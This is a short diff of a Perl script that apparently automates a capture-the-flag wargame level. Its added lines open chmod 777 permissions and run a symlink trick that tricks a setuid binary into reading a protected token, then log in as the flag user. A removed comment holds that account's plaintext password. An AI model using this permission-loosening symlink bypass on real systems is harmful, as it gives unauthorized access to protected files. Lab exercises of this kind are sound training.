@@ -7,9 +7,10 @@ $red = "\e[31m";
 $green = "\e[32m";
 $reset = "\e[0m";
 
-$scp = "scp -q -P 4242 $user\@$ip:~/level08 .";
-print $red, $scp, $reset, "\n";
-system($scp);
+$exploit = "ssh -qp 4242 $user\@$ip 'chmod 777 . && ln -s token flag && ./level08 flag'";
+print $red, $exploit, $reset, "\n";
+system($exploit);
 
-# ln -s token flag && chmod 777 flag
-# flag08 quif5eloekouj29ke0vouxean
+$flag = "ssh -qp 4242 flag08\@$ip 'getflag'";
+print $green, $flag, $reset, "\n";
+system($flag);
